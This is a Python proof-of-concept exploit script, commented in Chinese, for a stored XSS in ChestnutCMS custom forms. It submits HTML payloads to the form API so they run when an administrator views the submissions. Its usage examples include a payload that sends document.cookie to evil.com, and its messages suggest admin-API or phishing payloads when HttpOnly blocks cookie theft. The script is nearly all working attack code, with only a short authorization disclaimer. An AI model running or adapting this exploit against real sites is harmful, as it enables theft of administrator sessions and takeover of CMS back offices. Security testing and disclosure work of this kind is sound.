#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC: ChestnutCMS 自定义表单存储型 XSS (Stored XSS)
====================================================

漏洞概述
--------
- 入口: POST /api/customform/submit
- 根因: 后端对 controlType='UEditor' 的富文本字段不做任何 HTML 过滤
        (CustomFormApiServiceImpl.submit -> ModelDataServiceImpl.saveModelData,
         UEditor 控件类型沿用接口默认 valueAsString -> obj.toString())
- 触发: 管理员后台「自定义表单数据」页面 data.vue 第 87 行
        <div class="rich-content" v-html="scope.row[field.code]"></div>
        直接渲染入库内容, 导致存储型 XSS, 可窃取管理员 Cookie / 劫持后台。

授权声明
--------
本脚本仅用于对自有/已获授权的 ChestnutCMS 部署进行安全测试与漏洞验证。
禁止用于任何未授权目标。使用者自行承担一切法律责任。

依赖: pip install requests

用法示例
--------
# 1) 目标表单未开启验证码和登录 (最常见, 默认):
python poc_customform_xss.py -t http://localhost:8080 -f 1 -F content

# 2) 自定义 XSS 载荷:
python poc_customform_xss.py -t http://localhost:8080 -f 1 -F content \
    -p '<img src=x onerror=fetch("https://evil.com/c?"+document.cookie)>'

# 3) 同时注入多个 UEditor 字段:
python poc_customform_xss.py -t http://localhost:8080 -f 1 -F content -F remark
"""

import argparse
import sys
import uuid as uuidlib

try:
    import requests
except ImportError:
    sys.exit("[-] 缺少依赖 requests, 请先安装: pip install requests")

# ---------------------------------------------------------------------------
# 关键常量: 来自源码 CustomFormConsts.PARAMETER_UUID = "cc-uuid"
# UUID 仅通过 header/参数 cc-uuid (或参数 uuid) 传递, 不读 Cookie、不读 body。
# ---------------------------------------------------------------------------
SUBMIT_PATH = "/api/customform/submit"

DEFAULT_PAYLOAD = '<img src=x onerror="alert(document.cookie)">'


def log(msg):
    print(f"[*] {msg}")


def ok(msg):
    print(f"[+] {msg}")


def warn(msg):
    print(f"[!] {msg}")


def err(msg):
    print(f"[-] {msg}", file=sys.stderr)


def submit(base_url, form_id, fields):
    """
    提交表单数据。
    """
    url = base_url + SUBMIT_PATH
    headers = {
        "Content-Type": "application/json; charset=utf-8",
        "cc-uuid": "123"
    }
    payload = {"formId": form_id}
    payload.update(fields)

    resp = requests.post(url, headers=headers, json=payload)
    try:
        body = resp.json()
    except ValueError:
        body = {"code": resp.status_code, "msg": resp.text[:200]}
    return resp.status_code, body


def parse_field_args(field_args):
    """解析 -F/--field 参数, 支持 'code' 或 'code:TYPE', 返回字段 code 列表。"""
    codes = []
    for fa in field_args:
        code = fa.split(":", 1)[0].strip()
        if code:
            codes.append(code)
    return codes


def main():
    parser = argparse.ArgumentParser(
        description="ChestnutCMS 自定义表单存储型 XSS PoC (仅限测试)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="示例: python poc_customform_xss.py -t http://localhost:9080 -f 1 -F content",
    )
    parser.add_argument("-t", "--target", required=True,
                        help="目标基础地址, 如 http://localhost:8080 (含站点前缀则一并带上)")
    parser.add_argument("-f", "--form-id", required=True, type=int,
                        help="自定义表单 ID (formId)")
    parser.add_argument("-F", "--field", action="append", required=True, metavar="CODE",
                        help="UEditor 字段 code, 可多次指定向多个字段注入")
    parser.add_argument("-p", "--payload", default=DEFAULT_PAYLOAD,
                        help="XSS 载荷 (默认弹窗探测)")
    parser.add_argument("--extra", action="append", default=[], metavar="CODE=VAL",
                        help="附加普通字段(避免必填校验), 如 --extra name=test")
    args = parser.parse_args()

    base_url = args.target.rstrip("/")
    session_uuid = uuidlib.uuid4().hex

    field_codes = parse_field_args(args.field)
    inject = {code: args.payload for code in field_codes}
    for kv in args.extra:
        if "=" not in kv:
            err(f"--extra 格式应为 CODE=VAL: {kv}")
            sys.exit(1)
        k, v = kv.split("=", 1)
        inject[k] = v

    print("=" * 64)
    print(" ChestnutCMS 自定义表单存储型 XSS PoC  (仅限授权测试)")
    print("=" * 64)
    log(f"目标: {base_url}")
    log(f"formId={args.form_id}  会话uuid={session_uuid}")
    log(f"注入字段: {field_codes}")
    log(f"载荷: {args.payload}")

    # ---- 提交恶意载荷 ----
    try:
        status, body = submit(base_url, args.form_id, inject)
    except Exception as e:
        err(f"提交请求异常: {e}")
        sys.exit(1)

    log(f"HTTP {status}  响应: {body}")
    code = body.get("code")
    msg = str(body.get("msg"))

    if code == 200:
        print()
        ok("提交成功: 恶意载荷已写入数据库。")
        ok("触发路径: 管理员登录后台 -> CMS -> 自定义表单 -> 数据管理 "
           f"(formId={args.form_id}) -> 点击富文本字段的查看图标(眼睛) -> XSS 执行")
        warn("如开启了 HttpOnly 的会话 Cookie, document.cookie 可能取不到; "
             "可改用调用后台 API / 钓鱼等载荷验证执行。")
        sys.exit(0)
    else:
        err(f"提交失败: code={code}, msg={msg}")
        hints = {
            "验证码": "验证码答案错误, 或表单已开启验证码需加 --captcha",
            "captcha": "验证码答案错误, 或表单已开启验证码需加 --captcha",
            "登录": "表单需要登录(needLogin=Yes), 需先取得会员登录凭证后再提交",
            "必填": "存在必填字段被绕过, 请用 --extra 补齐",
        }
        for k, v in hints.items():
            if k in msg:
                warn("提示: " + v)
        sys.exit(1)


if __name__ == "__main__":
    main()
